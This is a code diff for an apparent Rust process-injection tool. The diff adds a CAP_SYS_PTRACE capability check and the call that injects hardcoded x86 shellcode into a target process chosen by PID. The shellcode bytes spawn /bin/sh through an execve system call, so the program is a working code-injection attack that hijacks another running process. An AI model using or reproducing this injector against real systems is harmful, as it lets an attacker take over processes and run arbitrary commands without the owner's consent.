@@ -3,6 +3,7 @@ extern crate clap;
 
 mod injection;
 use std::process::exit;
+use caps::{Capability, CapSet};
 
 fn main() {
     let yaml = load_yaml!("options.yml");
@@ -24,12 +25,20 @@ fn main() {
         exit(1);
     }
 
+    if !caps::has_cap(None, CapSet::Permitted, Capability::CAP_SYS_PTRACE).unwrap() {
+        eprintln!("You need CAP_SYS_PTRACE!!");
+        exit(1);
+    }
+
     let shellcode = b"jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80"
         .iter()
         .map(|x| *x)
         .collect::<Vec<u8>>();
     let injector = injection::Injector::new(target_pid, shellcode).unwrap_or_else(|e| {
-        eprintln!("Cannot create injector object. {}", e);
+        eprintln!("{}", e);
         exit(1)
     });
+    if let Err(e) = injector.inject() {
+        eprintln!("{}", e);
+    }
 }
